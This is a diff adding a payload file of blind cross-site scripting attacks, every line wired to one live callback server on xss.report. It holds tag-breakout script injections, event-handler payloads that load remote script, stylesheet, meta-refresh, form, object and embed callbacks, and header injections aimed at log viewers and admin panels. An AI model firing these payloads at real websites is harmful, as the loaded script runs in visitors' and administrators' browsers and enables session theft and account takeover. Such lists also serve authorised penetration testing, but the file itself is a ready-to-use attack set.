@@ -1,0 +1,51 @@
+# Blind XSS Payloads — xss.report Server
+# Server: https://xss.report/c/yukthi93
+
+# === PRIMARY PAYLOAD (user's server) ===
+"><script src=https://xss.report/c/yukthi93></script>
+<script src=https://xss.report/c/yukthi93></script>
+'><script src=https://xss.report/c/yukthi93></script>
+</script><script src=https://xss.report/c/yukthi93></script>
+</textarea><script src=https://xss.report/c/yukthi93></script>
+</title><script src=https://xss.report/c/yukthi93></script>
+</style><script src=https://xss.report/c/yukthi93></script>
+
+# === Context-Aware script src injections ===
+" autofocus onfocus="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)" x="
+' autofocus onfocus="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)" x='
+<img src=x onerror="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+<svg onload="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+<body onload="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+<details open ontoggle="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+<input autofocus onfocus="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+<iframe onload="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
+
+# === Polyglot blind (works in most contexts) ===
+"><script src=https://xss.report/c/yukthi93></script>
+'><script src=https://xss.report/c/yukthi93></script>
+`><script src=https://xss.report/c/yukthi93></script>
+
+# === Without tag breakouts (if injected directly) ===
+<script src=https://xss.report/c/yukthi93></script>
+<script src='https://xss.report/c/yukthi93'></script>
+<script src="https://xss.report/c/yukthi93"></script>
+
+# === CSS/Link callback ===
+<link rel=stylesheet href=https://xss.report/c/yukthi93>
+<style>@import url(https://xss.report/c/yukthi93)</style>
+<meta http-equiv=refresh content=0;url=https://xss.report/c/yukthi93>
+
+# === Form callback ===
+<form action=https://xss.report/c/yukthi93 method=POST><button autofocus onfocus=submit()>click</form>
+
+# === Object/Embed callback ===
+<object data=https://xss.report/c/yukthi93>
+<embed src=https://xss.report/c/yukthi93>
+<iframe src=https://xss.report/c/yukthi93>
+
+# === HTTP Header injection (for log viewers / admin panels) ===
+Mozilla/5.0 <script src=https://xss.report/c/yukthi93></script>
+Referer: https://xss.report/c/yukthi93
+X-Forwarded-For: <script src=https://xss.report/c/yukthi93></script>
+X-Forwarded-For: "><script src=https://xss.report/c/yukthi93></script>
+CF-Connecting-IP: <script src=https://xss.report/c/yukthi93></script>
